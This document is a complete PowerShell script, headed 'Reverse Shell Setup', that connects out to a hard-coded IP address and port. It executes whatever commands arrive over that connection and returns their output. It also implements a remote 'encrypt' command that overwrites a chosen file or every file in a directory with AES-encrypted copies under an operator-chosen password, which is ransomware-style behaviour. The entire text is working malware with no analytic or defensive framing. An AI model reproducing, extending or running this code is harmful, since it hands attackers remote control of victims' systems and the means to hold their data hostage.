# Reverse Shell Setup
$ip = "192.168.1.158"
$port = 4444

try {
    $client = New-Object Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
} catch {
    Write-Error "Failed to establish a connection: $_"
    exit
}

$buffer = New-Object Byte[] 1024
$encoding = New-Object Text.ASCIIEncoding

function Send-Data {
    param ([string]$data)
    $bytes = $encoding.GetBytes($data)
    $stream.Write($bytes, 0, $bytes.Length)
}

function Receive-Data {
    $position = 0
    while (($readBytes = $stream.Read($buffer, $position, $buffer.Length - $position)) -ne 0) {
        $position += $readBytes
        if ($buffer[$position - 1] -eq 10) {
            break
        }
    }
    return $encoding.GetString($buffer, 0, $position - 1)
}

function Protect-AESFile {
    Param(
        [Byte[]]$FileBytes,
        [String]$Password,
        [Byte[]]$Salt,
        [String]$HashAlgorithm = "SHA512"
    )

    if (-not $Salt) {
        $Salt = New-Object byte[] 16
        [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($Salt)
    }

    $PasswordBytes = [System.Text.Encoding]::ASCII.GetBytes($Password)

    [System.IO.MemoryStream]$MemoryStream = New-Object System.IO.MemoryStream
    [System.Security.Cryptography.Aes]$AES = [System.Security.Cryptography.Aes]::Create()
    $AES.KeySize = 256
    $AES.BlockSize = 128
    [System.Security.Cryptography.Rfc2898DeriveBytes]$Key = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($PasswordBytes, $Salt, 1000, [System.Security.Cryptography.HashAlgorithmName]::$HashAlgorithm)
    $AES.Key = $Key.GetBytes($AES.KeySize / 8)
    $AES.IV = $Key.GetBytes($AES.BlockSize / 8)
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $AES.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

    try {
        $CryptoStream.Write($FileBytes, 0, $FileBytes.Length)
        $CryptoStream.Close()
    } catch {
        Write-Error "Error occurred while encoding file. Password, Salt, or HashAlgorithm incorrect?"
        return $null
    }

    $EncryptedBytes = $MemoryStream.ToArray()
    return $Salt + $EncryptedBytes
}

function Encrypt-FilesInDirectory {
    Param(
        [string]$DirectoryPath,
        [string]$Password
    )

    Write-Host "Encrypting all files in directory: $DirectoryPath"

    $SecurePassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString -String $Password -AsPlainText -Force)))

    Get-ChildItem -Path $DirectoryPath -File | ForEach-Object {
        $FilePath = $_.FullName
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $EncryptedBytes = Protect-AESFile -FileBytes $FileBytes -Password $SecurePassword
        if ($EncryptedBytes) {
            [System.IO.File]::WriteAllBytes($FilePath, $EncryptedBytes)
            Write-Host "File encrypted: $FilePath"
        } else {
            Write-Host "Failed to encrypt the file: $FilePath"
        }
    }
}

function Encrypt-File {
    Param(
        [string]$FilePath,
        [string]$Password
    )

    Write-Host "Starting encryption for file: $FilePath"

    $SecurePassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString -String $Password -AsPlainText -Force)))

    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $EncryptedBytes = Protect-AESFile -FileBytes $FileBytes -Password $SecurePassword
    if ($EncryptedBytes) {
        [System.IO.File]::WriteAllBytes($FilePath, $EncryptedBytes)
        Write-Host "File encrypted successfully."
    } else {
        Write-Host "Failed to encrypt the file."
    }
}

# Main Interactive Loop
while ($true) {
    $command = Receive-Data
    if ($command.StartsWith("encrypt ")) {
        $commandArgs = $command.Substring(8).Trim()
        $splitIndex = $commandArgs.LastIndexOf(' ')
        if ($splitIndex -gt 0) {
            $path = $commandArgs.Substring(0, $splitIndex).Trim()
            $password = $commandArgs.Substring($splitIndex + 1).Trim()

            if (Test-Path $path -PathType Container) {
                Encrypt-FilesInDirectory -DirectoryPath $path -Password $password
                Send-Data "Directory encrypted: $path`n"
            } elseif (Test-Path $path -PathType Leaf) {
                Encrypt-File -FilePath $path -Password $password
                Send-Data "File encrypted: $path`n"
            } else {
                Send-Data "Path not found: $path`n"
            }
        } else {
            Send-Data "Invalid command format. Usage: encrypt <file_path|directory_path> <password>`n"
        }
    } else {
        $output = Invoke-Expression $command 2>&1
        Send-Data "$output`n"
    }
}
